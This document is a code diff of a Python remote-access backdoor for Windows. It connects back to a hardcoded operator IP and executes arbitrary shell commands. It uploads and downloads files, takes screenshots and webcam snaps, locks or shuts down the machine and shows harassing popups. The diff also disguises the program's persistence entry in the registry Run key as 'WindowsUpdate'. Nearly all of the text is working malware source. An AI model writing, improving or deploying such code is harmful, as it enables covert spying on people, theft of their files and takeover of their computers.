@@ -7,6 +7,7 @@ import socket
 import ctypes
 import base64
 import spyware
+import datetime
 import subprocess
 from winreg import *
 import task_manager as tm
@@ -15,16 +16,18 @@ from shutil import copyfile
 
 class backdoor:
     try:
-        work_manager = tm.manager()
-        current_username = spyware.spyware.current_user = os.getlogin()     #Static Variables
-        
+        task_manager = tm.manager()
+        current_username = spyware.spyware.current_user = os.getlogin()
+
         hacked_msg_list = ["Brace yourself as pain is crawling towards you.", "{}, You are being controlled by an Indian Scammer!.".format(current_username)]
         troll_msg_list = ["Wake up {}...".format(current_username), "The Matrix has you... ", "Follow the white rabbit.", "Knock, Knock, {}.".format(current_username)]
         
         PATH = os.path.realpath(sys.argv[0])
         TMP = os.environ["TEMP"]
         APPDATA = os.environ["APPDATA"]
-        UPLOADING_SFX_PATH = TMP + "\Music.wav"    
+        USER_PROFILE = os.environ["USERPROFILE"]
+
+        UPLOADING_SFX_PATH = USER_PROFILE + "\\Music.wav"
 
         tm_enabled = True
     except Exception:
@@ -33,10 +36,14 @@ class backdoor:
     def __init__(self, ip, port):
         while True:
             try:
-                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     #Address family, Socket tpye
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.connection.connect((ip, port))
+                self.REG_NAME = "WindowsUpdate"
             except socket.error:
-                time.sleep(5)
+                wait_time = 5
+                print("[-] Error while trying to connect, trying again in {} seconds.".format(wait_time))
+                
+                time.sleep(wait_time)
             else:
                 break
 
@@ -72,7 +79,7 @@ class backdoor:
                 copyfile(self.PATH, app_path)
 
             reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
-            SetValueEx(reg_key, "winupdate", 0, REG_SZ, app_path)
+            SetValueEx(reg_key, self.REG_NAME, 0, REG_SZ, app_path)
             CloseKey(reg_key)
         except WindowsError as e:
             if not on_startup:
@@ -84,7 +91,7 @@ class backdoor:
     def remove_from_startup(self):
         try:
             reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
-            DeleteValue(reg_key, "winupdate")
+            DeleteValue(reg_key, self.REG_NAME)
             CloseKey(reg_key)
         except FileNotFoundError:
             return "[-] The program is not registered in startup."
@@ -150,7 +157,7 @@ class backdoor:
             spw = spyware.spyware()
             return spw.get_info()
         except Exception as e:
-            return "[-] Could'nt get System Information: {}.".format(e)
+            return "[-] Couldn't get System Information: {}.".format(e)
 
     def get_current_user(self):
         try:
@@ -178,13 +185,15 @@ class backdoor:
 
     def get_screenshot(self):
         try:
+            current_time = datetime.datetime.now()
             screenshot = ImageGrab.grab()
-            path = self.APPDATA + "\SavedScreenshot.png"
 
+            path = "{}\\Screenshot{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
             screenshot.save(path)
-            data = self.read_file(path)
 
-            self.work_manager.delete_path(path)
+            data = self.read_file(path)
+            self.task_manager.delete_path(path)
+            
             return data
         except Exception as e:
             return "[-] Error getting screenshot data: {}.".format(e)
@@ -192,13 +201,15 @@ class backdoor:
     def get_webcam_snap(self):
         try:
             cam = cv2.VideoCapture(0)
-            
             ret, frame = cam.read()
-            path = self.APPDATA + "\\CapturedWebcam.png"
+
+            current_time = datetime.datetime.now()
+            path = "{}\\Webcam{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
+
             cv2.imwrite(path, frame)
 
             file_data = self.read_file(path)
-            self.work_manager.delete_path(path)
+            self.task_manager.delete_path(path)
 
             cam.release()
             cv2.destroyAllWindows()
@@ -211,13 +222,13 @@ class backdoor:
         for i in range(len(msg_list)):
             self.show_message_box_popup(msg_list[i])
             if i == len(msg_list) - 1:
-                time.sleep(wait_time / 2)
+                time.sleep(wait_time / 3)
             else:
                 time.sleep(wait_time)
 
-        self.work_manager.play_sound(self.UPLOADING_SFX_PATH, False)
+        self.task_manager.play_sound(self.UPLOADING_SFX_PATH, False)
 
-    def change_working_directory_to(self, path):
+    def change_working_directory(self, path):
         try:
             os.chdir(path)
             return "[+] Changing directory to: {}.".format(os.getcwd())
@@ -248,66 +259,75 @@ class backdoor:
             rest_of_command_as_list = rest_of_command.split(" ")
 
             try:
-                if len(rest_of_command) == 0:
-                    if command_0 == "exit":     #Exit the program
+                command_result = ""
+                if len(rest_of_command) == 0:       # Commands with no arguments
+                    if command_0 == "exit":     # Exit the program
                         self.connection.close()
                         exit()
                     elif command_0 == "user":
                         command_result = self.get_current_user()
-                    elif command_0 == "info":       #Get Info about the system
+                    elif command_0 == "info":       # Get Info about the system
                         command_result = self.get_system_information()
-                    elif command_0 == "tsmanager":      #Change task manager state
+                    elif command_0 == "tsmanager":      # Change task manager state
                         command_result = self.change_tm_state()                        
-                    elif command_0 == "startup":        #Add to startup
+                    elif command_0 == "startup":        # Add to startup
+                        reg = "".join(rest_of_command_as_list[1:-1])
+                        if reg:
+                            self.REG_NAME = reg
+
                         command_result = self.add_to_startup(False)
-                    elif command_0 == "rmstartup":      #Remove from startup
+                    elif command_0 == "rmstartup":      # Remove from startup
+                        reg = "".join(rest_of_command_as_list[1:-1])
+                        if reg:
+                            self.REG_NAME = reg
+
                         command_result = self.remove_from_startup()
-                    elif command_0 == "screenshot":     #Get screenshot
+                    elif command_0 == "screenshot":     # Get screenshot
                         command_result = self.get_screenshot()
-                    elif command_0 == "stsound":      #Stop playing a sound
-                        command_result = self.work_manager.play_sound("", True)
-                    elif command_0 == "idle":       #Get how much time idle
-                        command_result = self.work_manager.get_idle_duration()
-                    elif command_0 == "ps":     #List processes
-                        command_result = self.work_manager.get_processes()
+                    elif command_0 == "stsound":      # Stop playing a sound
+                        command_result = self.task_manager.play_sound("", True)
+                    elif command_0 == "idle":       # Get how much time idle
+                        command_result = self.task_manager.get_idle_duration()
+                    elif command_0 == "ps":     # List processes
+                        command_result = self.task_manager.get_processes()
                     elif command_0 == "webcam":
-                        command_result = self.get_webcam_snap()
-                    else:       #System command
+                        command_result = self.get_webcam_snap()                                          
+                    else:       # System command
                         command_result = self.execute_system_command(command)
-                else:
-                    if command_0 == "cd":   #Change directory
-                        command_result = self.change_working_directory_to(rest_of_command)
-                    elif command_0 == "download":       #Download a file
+                else:       # Commands that require arguments
+                    if command_0 == "cd":   # Change directory
+                        command_result = self.change_working_directory(rest_of_command)
+                    elif command_0 == "download":       # Download a file
                         command_result = self.read_file(rest_of_command)
-                    elif command_0 == "upload":     #Upload a file
+                    elif command_0 == "upload":     # Upload a file
                         p_index = rest_of_command_as_list.index("-p")
                         t_index = rest_of_command_as_list.index("-t")
                     
-                        file_location = " ".join(rest_of_command_as_list[t_index + 1:len(rest_of_command_as_list) - 1])       #What's between -t and the data sent by the server
+                        file_location = " ".join(rest_of_command_as_list[t_index + 1:len(rest_of_command_as_list) - 1])       # What's between -t and the data sent by the server
                         file_name = " ".join(rest_of_command_as_list[p_index + 1:t_index])
                         head, tail = os.path.split(file_name)
                         data = rest_of_command_as_list[-1]
                         
                         path = file_location + "\\" + tail
                         command_result = self.write_file(path, data)
-                    elif command_0 == "read":   #Read file's content
-                        command_result = self.work_manager.read_content_of_file(rest_of_command)
-                    elif command_0 == "psound":     #Play sound
-                        command_result = self.work_manager.play_sound(rest_of_command, False)
-                    elif command_0 == "del":    #Delete file\folder
-                        command_result = self.work_manager.delete_path(rest_of_command)
-                    elif command_0 == "launch":     #Launch file\folder
-                        command_0 = self.work_manager.launch_file(rest_of_command)
-                    elif command_0 == "cgstate":    #Change state of computer(lock, shutdown)
+                    elif command_0 == "read":   # Read file's content
+                        command_result = self.task_manager.read_content_of_file(rest_of_command)
+                    elif command_0 == "psound":     # Play sound
+                        command_result = self.task_manager.play_sound(rest_of_command, False)
+                    elif command_0 == "del":    # Delete file\folder
+                        command_result = self.task_manager.delete_path(rest_of_command)
+                    elif command_0 == "launch":     # Launch file\folder
+                        command_0 = self.task_manager.launch_file(rest_of_command)
+                    elif command_0 == "cgstate":    # Change state of computer(lock, shutdown)
                         if rest_of_command == "1":
-                            command_result = self.lock_system()     #Lock the system
+                            command_result = self.lock_system()     # Lock the system
                         elif rest_of_command == "2":
-                            command_result = self.shutdown_system("-s")     #Restart
+                            command_result = self.shutdown_system("-s")     # Restart
                         elif rest_of_command == "3":
-                            command_result = self.shutdown_system("-r")     #Shut down
+                            command_result = self.shutdown_system("-r")     # Shut down
                         else:
                             command_result = "[-] (Client) No such parameter for cgstate."
-                    elif command_0 == "troll":      #Troll the user
+                    elif command_0 == "troll":      # Troll the user
                         if rest_of_command_as_list[0] != "1" and rest_of_command_as_list[0] != "2":
                             command_result = "[-] (Client) No such parameter for troll."
                         else:
@@ -315,13 +335,13 @@ class backdoor:
                                 self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
                                
                                 command_result = self.troll_user(self.hacked_msg_list, 5)                                
-                                self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
+                                self.task_manager.delete_path(self.UPLOADING_SFX_PATH)
                             elif rest_of_command_as_list[0] == "2":
                                 self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
                                 
                                 command_result = self.troll_user(self.troll_msg_list, 6)
-                                self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
-                    elif command_0 == "sdmsg":      #Send a message
+                                self.task_manager.delete_path(self.UPLOADING_SFX_PATH)
+                    elif command_0 == "sdmsg":      # Send a message
                         command_result = self.show_message_box_popup(rest_of_command)
                     else:       #System command
                         command_result = self.execute_system_command(command)
@@ -330,5 +350,5 @@ class backdoor:
 
             self.reliable_send(command_result)
 
-my_backdoor = backdoor("192.168.1.107", 4040)
+my_backdoor = backdoor("192.168.1.116", 8080)
 my_backdoor.run()
